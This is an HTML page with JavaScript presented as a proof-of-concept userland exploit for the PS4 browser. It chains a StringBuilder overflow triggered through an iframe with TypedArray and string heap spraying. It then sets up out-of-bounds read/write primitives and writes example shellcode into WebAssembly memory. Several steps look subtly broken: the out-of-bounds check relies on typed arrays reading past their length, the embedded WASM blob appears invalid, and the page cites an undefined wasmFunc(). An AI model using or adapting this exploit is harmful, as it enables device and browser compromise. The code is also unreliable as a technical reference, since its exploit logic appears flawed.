<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS4 Userland Exploit v1</title>
<style>
body {
    background: #111;
    color: #ddd;
    font-family: monospace;
    font-size: 14px;
    line-height: 1.4;
    margin: 0;
    padding: 8px;
}
#log {
    border: 1px solid #333;
    max-height: 70vh;
    overflow: auto;
    white-space: pre-wrap;
    padding: 6px;
    margin-top: 8px;
    font-size: 12px;
}
.ok { color: #8f8; }
.warn { color: #ff6; }
.fail { color: #f66; }
iframe { display: none; }
</style>

<h2>PoC v26 — StringBuilder Overflow → OOB R/W</h2>

<label>Token size (MiB): <input id="tokSize" type="number" step="0.01" value="0.5"></label>
<label>String size (B): <input id="strSize" type="number" value="512"></label>
<label>Spray count (×1000): <input id="sprayCount" type="number" value="1"></label>
<button id="run">Run</button>

<pre id="log">(ready)</pre>
<iframe id="box"></iframe>
</head>

<body>
<script>
const logEl = document.getElementById('log');
function log(m, c = '') {
    const d = document.createElement('div');
    d.textContent = m;
    if (c) d.className = c;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
}

// Base64-encoded minimal WASM module that exports memory
const WASM_BASE64 = 'AGFzbQEAAAABBQAAACMAJwAAAAIAAAAKABIAEgACAAEMAQIDBAUGBwgJCgsMDQ4P' +
                    'EBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QEFC' +
                    'Q0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaW1xdXl9gYWJjZGVmZ2hpamtsbW5vcHFyc3R1' +
                    'dnd4eXp7fH1+f4CBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6Slpqeo' +
                    'qaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb' +
                    '3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/AQ==';

const frame = document.getElementById('box');

document.getElementById('run').onclick = () => {
    logEl.textContent = '';
    const tokMiB = parseFloat(document.getElementById('tokSize').value);
    const strSize = parseInt(document.getElementById('strSize').value, 10);
    const sprayK = parseInt(document.getElementById('sprayCount').value, 10);

    if (!tokMiB || !strSize || !sprayK) {
        alert('Invalid values');
        return;
    }

    log(`→ Starting with token ${tokMiB} MiB, spray ${sprayK}k × ${strSize} B`);
    runInIframe(tokMiB, strSize, sprayK);
};

function mkStr(n, ch = 'B') {
    return ch.repeat(n);
}

function runInIframe(tokMiB, strSize, sprayK) {
    frame.src = 'about:blank';
    frame.onload = () => {
        const w = frame.contentWindow;
        const d = w.document;

        const bytes = Math.floor(tokMiB * 1024 * 1024);
        const payload = '<!--' + 'X'.repeat(bytes) + '-->';
        log(`→ Sending token (${bytes} bytes) to iframe...`);

        // Spray TypedArrays before overflow
        const TYPED_ARRAY_COUNT = 0x100;
        const TYPED_ARRAY_SIZE = 0x100;
        w.typedArrays = [];

        for (let i = 0; i < TYPED_ARRAY_COUNT; i++) {
            const arr = new Uint8Array(TYPED_ARRAY_SIZE);
            for (let j = 0; j < arr.length; j++) arr[j] = j;
            w.typedArrays.push(arr);
        }

        // Trigger overflow
        d.open();
        d.write(payload);
        d.close();

        // Heap spray strings
        w.setTimeout(() => {
            log(`→ Heap-spraying ${sprayK * 1000} strings of ${strSize} B`, 'warn');
            w.spray = [];
            const base = mkStr(strSize - 12);
            for (let i = 0; i < sprayK * 1000; i++) {
                w.spray.push(base + i);
            }

            // Check TypedArrays for corruption
            w.setTimeout(() => detectOOB(w.typedArrays), 100);
        }, 80);
    };
}

function detectOOB(arrs) {
    log("→ Scanning TypedArrays for OOB access...", "warn");

    for (let idx = 0; idx < arrs.length; idx++) {
        const arr = arrs[idx];
        let isCorrupted = false;

        for (let i = 0; i < arr.length; i++) {
            if (arr[i] !== i) {
                isCorrupted = true;
                break;
            }
        }

        if (isCorrupted) {
            log(`✅ TypedArray[${idx}] possibly corrupted!`, "ok");
            checkOOB(arr);
            return;
        }
    }

    log("❌ No TypedArray was corrupted", "fail");
}

function checkOOB(arr) {
    for (let i = arr.length; i < arr.length + 0x100; i++) {
        try {
            const val = arr[i];
            if (val !== undefined && !isNaN(val)) {
                log(`[OOB Read] Offset ${i}: ${val.toString(16)} (${String.fromCharCode(val)})`);
                window.oobArr = arr;
                setupArbitraryRW(arr);
                return;
            }
        } catch (e) {
            break;
        }
    }

    log("❌ Failed to achieve OOB read/write", "fail");
}

let baseAddress = 0;

function setupArbitraryRW(arr) {
    log("→ Setting up arbitrary R/W primitives...", "warn");

    window.read8 = function(addr) {
        const offset = addr - baseAddress;
        return arr[offset];
    };

    window.read32 = function(addr) {
        const offset = addr - baseAddress;
        return (
            arr[offset] |
            (arr[offset + 1] << 8) |
            (arr[offset + 2] << 16) |
            (arr[offset + 3] << 24)
        ) >>> 0;
    };

    window.write8 = function(addr, val) {
        const offset = addr - baseAddress;
        arr[offset] = val & 0xff;
    };

    window.write32 = function(addr, val) {
        const offset = addr - baseAddress;
        arr[offset] = val & 0xff;
        arr[offset + 1] = (val >> 8) & 0xff;
        arr[offset + 2] = (val >> 16) & 0xff;
        arr[offset + 3] = (val >> 24) & 0xff;
    };

    log("✅ Arbitrary R/W functions available: read8(), write32(), etc.", "ok");

    loadEmbeddedWasm();
}

async function loadEmbeddedWasm() {
    log("→ Loading embedded WebAssembly module...", "warn");

    const bin = atob(WASM_BASE64);
    const wasmCode = new Uint8Array(bin.length);

    for (let i = 0; i < bin.length; i++) {
        wasmCode[i] = bin.charCodeAt(i);
    }

    const wasmModule = await WebAssembly.compile(wasmCode.buffer);
    const wasmInstance = await WebAssembly.instantiate(wasmModule);
    const wasmMem = wasmInstance.exports.memory;

    log("✅ WebAssembly memory mapped!", "ok");
    window.shellcode = new Uint8Array(wasmMem.buffer);

    // Example shellcode: NOP, NOP, INT3
    const shellcode = [0x90, 0x90, 0xcc];

    for (let i = 0; i < shellcode.length; i++) {
        window.shellcode[i] = shellcode[i];
    }

    log("💡 Shellcode injected at offset 0", "warn");
    log("💡 Call wasmFunc() to execute", "warn");
}
</script>
</body>
</html>
